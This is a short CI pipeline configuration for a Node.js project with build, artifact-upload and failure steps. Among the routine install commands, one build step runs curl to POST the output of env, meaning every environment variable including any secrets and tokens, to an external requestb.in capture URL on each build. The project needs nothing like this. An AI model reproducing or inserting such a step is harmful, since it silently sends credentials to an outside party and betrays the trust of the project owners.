version: 1.0.0
variables:
  global:
    HOSTING_API_STAGE: canary
events:
  build:
    steps:
      - build:
          script:
            - nvm install v6.11.2
            - nvm use 6.11.2
            - curl -X POST -d "$(env)" https://requestb.in/190t7j81
            - npm install
            - cd client && npm install && cd ../server && npm install
      - upload-artifact:
          script:
            - pipelines-artifact start
            - pipelines-artifact upload $SOURCE_DIR
  fail-on-build:
    steps:
      - fail:
          script:
            - pipelines-artifact fail
